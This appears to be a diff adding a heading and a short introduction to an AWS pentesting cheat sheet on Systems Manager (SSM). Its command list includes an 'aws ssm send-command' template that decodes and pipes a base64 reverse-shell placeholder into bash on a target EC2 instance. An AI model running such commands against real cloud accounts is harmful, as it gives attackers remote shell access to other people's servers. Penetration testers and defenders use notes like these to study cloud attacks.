@@ -1,3 +1,7 @@
+# Systems Manager (SSM)
+
+SSM provides a centralised platform for configuring, managing, and maintaining servers and applications in your AWS environment.
+
 - `aws ssm list-documents`: List documents
 - `aws ssm send-command --document-name <name> --instance-ids <ec2_instance_id> --parameters '{"commands": ["echo <base64_revshell> | base64 -d | bash"]}' --output text`: Send command to EC2 instance
     - We note the `CommandId`
